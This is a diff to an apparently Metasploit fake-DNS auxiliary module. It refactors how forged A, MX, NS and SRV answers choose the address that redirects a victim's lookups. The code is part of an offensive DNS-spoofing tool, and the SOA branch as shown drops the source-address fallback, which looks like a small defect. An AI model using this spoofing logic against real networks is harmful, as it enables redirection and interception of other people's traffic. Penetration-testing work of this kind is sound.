@@ -51,16 +51,20 @@ class Metasploit3 < Msf::Auxiliary
   end
 
 
+  def target_host(addr = nil)
+    target = datastore['TARGETHOST']
+    if target.blank?
+      if addr
+        ::Rex::Socket.source_address(addr)
+      else
+        nil
+      end
+    else
+      ::Rex::Socket.resolv_to_dotted(target)
+    end
+  end
+
   def run
-    @targ = datastore['TARGETHOST']
-    if(@targ and @targ.strip.length == 0)
-      @targ = nil
-    end
-
-    if(@targ)
-      @targ = ::Rex::Socket.resolv_to_dotted(@targ)
-    end
-
     @port = datastore['SRVPORT'].to_i
 
     @log_console  = false
@@ -91,6 +95,7 @@ class Metasploit3 < Msf::Auxiliary
     while @run
       @error_resolving = false
       packet, addr = @sock.recvfrom(65535)
+      src_addr = addr[3]
       @requestor = addr
       next if packet.length == 0
 
@@ -144,7 +149,7 @@ class Metasploit3 < Msf::Auxiliary
           # <hostname> SOA -> windows XP self hostname lookup
           #
 
-          answer = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
+          answer = Resolv::DNS::Resource::IN::A.new(target_host() )
 
           if (@match_target and not @bypass) or (not @match_target and @bypass)
             # Resolve FAKE response
@@ -171,63 +176,54 @@ class Metasploit3 < Msf::Auxiliary
         when 'IN::MX'
           mx = Resolv::DNS::Resource::IN::MX.new(10, Resolv::DNS::Name.create("mail.#{name}"))
           ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create("dns.#{name}"))
-          ar = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
+          ar = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))
           request.add_answer(name, 60, mx)
           request.add_authority(name, 60, ns)
           request.add_additional(Resolv::DNS::Name.create("mail.#{name}"), 60, ar)
 
         when 'IN::NS'
           ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create("dns.#{name}"))
-          ar = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
+          ar = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))
           request.add_answer(name, 60, ns)
           request.add_additional(name, 60, ar)
 
         when 'IN::SRV'
-          answers = []
-          authorities = []
-          additionals = []
-          resources = Resolv::DNS.new().getresources(Resolv::DNS::Name.create(name), Resolv::DNS::Resource::IN::SRV)
-          if resources.empty?
-            @error_resolving = true
-            print_error("Unable to resolve SRV record for #{name} -- skipping")
-            next
-          end
-
-          if @log_console
-            if @bypass || !@match_target
+          if @bypass || !@match_target
+            if @log_console
               print_status("DNS bypass domain #{@match_name} found; Returning real SRV records for #{name}")
-            else
+            end
+            # if we are in bypass mode or we are in fake mode but the target didn't match,
+            # just return the real response RRs
+            resources = Resolv::DNS.new().getresources(Resolv::DNS::Name.create(name), Resolv::DNS::Resource::IN::SRV)
+            if resources.empty?
+              @error_resolving = true
+              print_error("Unable to resolve SRV record for #{name} -- skipping")
+              next
+            end
+            resources.each do |resource|
+              host = resource.target
+              port = resource.port.to_i
+              weight = resource.weight.to_i
+              priority = resource.priority.to_i
+              ttl = resource.ttl.to_i
+              request.add_answer(
+                name,
+                ttl,
+                Resolv::DNS::Resource::IN::SRV.new(priority, weight, port, Resolv::DNS::Name.create(host))
+              )
+            end
+          else
+            if @log_console
               print_status("DNS target domain #{@match_name} found; Returning fake SRV records for #{name}")
-            end
-          end
-
-          resources.each do |resource|
-            host = resource.target
-            port = resource.port.to_i
-            weight = resource.weight.to_i
-            priority = resource.priority.to_i
-            if @bypass || !@match_target
-              # if we are in bypass mode or we are in fake mode but the target didn't match,
-              # just return the real response RRs
-              answers << Resolv::DNS::Resource::IN::SRV.new(priority, weight, port, Resolv::DNS::Name.create(host))
-            else
               # Prepare the FAKE response
-              answers << Resolv::DNS::Resource::IN::SRV.new(5,0,datastore['RR_SRV_PORT'],Resolv::DNS::Name.create(name))
-              additionals << [ host, @targ || ::Rex::Socket.source_address(addr[3].to_s) ]
-              authorities << Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create("dns.#{name}"))
+              request.add_answer(
+                name,
+                10,
+                Resolv::DNS::Resource::IN::SRV.new(5, 0, datastore['RR_SRV_PORT'], Resolv::DNS::Name.create(name))
+              )
+              request.add_additional(Resolv::DNS::Name.create(name), 60, Resolv::DNS::Resource::IN::A.new(target_host(src_addr)))
             end
           end
-          # don't uniq the SRV answers -- return what the real response had
-          answers.each { |srv| request.add_answer(name, 10, srv) }
-          # uniq the authorities and additional records since we are artificially
-          # inserting these into the response
-          authorities.uniq.each { |ns| request.add_authority(name, 60, ns) }
-          additionals.uniq.each do |host_and_ip|
-            host = host_and_ip.first
-            ip = host_and_ip.last
-            request.add_additional(Resolv::DNS::Name.create(host), 60, Resolv::DNS::Resource::IN::A.new(ip))
-          end
-
         when 'IN::PTR'
           soa = Resolv::DNS::Resource::IN::SOA.new(
             Resolv::DNS::Name.create("ns.internet.com"),
